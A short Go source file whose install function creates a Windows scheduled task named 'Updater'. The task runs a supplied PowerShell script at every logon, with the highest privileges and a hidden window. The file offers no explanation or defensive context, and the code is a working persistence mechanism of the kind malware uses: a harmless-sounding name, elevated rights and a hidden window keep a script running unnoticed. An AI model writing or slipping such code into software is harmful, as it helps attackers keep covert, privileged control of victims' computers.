package main

import (
	"fmt"
	"os/exec"
)

func install(script string) error {
	cmd := fmt.Sprintf(`schtasks /create /tn "Updater" /sc onlogon /rl highest /tr "pwsh -nop -win hid -f %s" /f`, script)
	return exec.Command("cmd", "/c", cmd).Run()
}
